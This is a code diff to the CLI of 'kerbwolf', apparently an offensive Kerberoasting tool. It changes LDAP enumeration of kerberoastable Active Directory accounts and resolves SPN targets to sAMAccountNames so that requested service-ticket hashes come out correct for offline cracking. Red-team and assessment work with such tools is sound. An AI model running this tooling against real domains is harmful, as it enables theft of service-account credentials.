@@ -10,7 +10,7 @@ from kerbwolf import __version__
 from kerbwolf.attacks.kerberoast import kerberoast, kerberoast_no_preauth
 from kerbwolf.cli._common import build_credential, collect_targets, ldap_connect_from_args, ldap_discover_all_users, output_results, parse_etypes, print_header, resolve_context
 from kerbwolf.core.ccache import load_tgt_from_ccache
-from kerbwolf.core.ldap import find_kerberoastable
+from kerbwolf.core.ldap import find_kerberoastable, resolve_spns
 from kerbwolf.log import Logger
 from kerbwolf.models import HashFormat, KerberosContext, KerbWolfError, RoastResult, TransportProtocol
 
@@ -120,6 +120,8 @@ def main(argv: list[str] | None = None) -> None:
 
     targets = list(dict.fromkeys(targets))
 
+    targets = _resolve_spn_targets(targets, args, logger, ctx)
+
     etypes = parse_etypes(args.enctype)
     transport = TransportProtocol(args.transport)
     hash_format = HashFormat(args.hash_format)
@@ -202,7 +204,13 @@ def main(argv: list[str] | None = None) -> None:
 
 
 def _ldap_discover(args: argparse.Namespace, logger: Logger, ctx: KerberosContext) -> list[str]:
-    """Enumerate kerberoastable targets via LDAP."""
+    """Enumerate kerberoastable targets via LDAP.
+
+    Returns sAMAccountNames (not SPNs).  The TGS-REQ sends the
+    sAMAccountName as the sname — the KDC resolves it to the correct
+    service account.  This ensures the TGS-REP echoes the sAMAccountName,
+    which makes pcap extraction produce correct hashes.
+    """
     if args.ldap_all:
         return ldap_discover_all_users(args, logger, ctx)
 
@@ -210,14 +218,48 @@ def _ldap_discover(args: argparse.Namespace, logger: Logger, ctx: KerberosContex
 
     logger.info("LDAP: searching for accounts with SPNs in %s", ctx.domain)
     accounts = find_kerberoastable(conn, ctx.domain)
-    spns: list[str] = []
+    names: list[str] = []
     for account in accounts:
         if account.spns:
-            spns.append(account.spns[0])
-            logger.verbose("  %s → %s", account.samaccountname, account.spns[0])
-    logger.info("LDAP: found %d kerberoastable accounts", len(spns))
+            names.append(account.samaccountname)
+            logger.verbose("  %s (SPN: %s)", account.samaccountname, account.spns[0])
+    logger.info("LDAP: found %d kerberoastable accounts", len(names))
     conn.unbind()
-    return spns
+    return names
+
+
+def _resolve_spn_targets(targets: list[str], args: argparse.Namespace, logger: Logger, ctx: KerberosContext) -> list[str]:
+    """Replace any SPN targets in the list with their resolved sAMAccountNames.
+
+    Opens an LDAP connection to resolve SPNs (targets containing ``/``).
+    The resolved sAMAccountName replaces the SPN in the target list so
+    the TGS-REQ sends the sAMAccountName as sname.  SPNs that can't be
+    resolved stay as-is (salt probe warning will fire for AES etypes).
+    """
+    spn_targets = [t for t in targets if "/" in t]
+    if not spn_targets:
+        return targets
+
+    try:
+        conn = ldap_connect_from_args(args, logger, ctx)
+    except SystemExit:
+        logger.verbose("LDAP unavailable — SPN targets will use raw SPN as sname")
+        return targets
+
+    logger.info("LDAP: resolving %d SPN target(s) to sAMAccountName", len(spn_targets))
+    resolved = resolve_spns(conn, ctx.domain, spn_targets)
+    conn.unbind()
+
+    result: list[str] = []
+    for t in targets:
+        if t in resolved:
+            logger.verbose("  %s → %s", t, resolved[t])
+            result.append(resolved[t])
+        else:
+            if "/" in t:
+                logger.warning("SPN %s: could not resolve to sAMAccountName", t)
+            result.append(t)
+    return list(dict.fromkeys(result))
 
 
 if __name__ == "__main__":
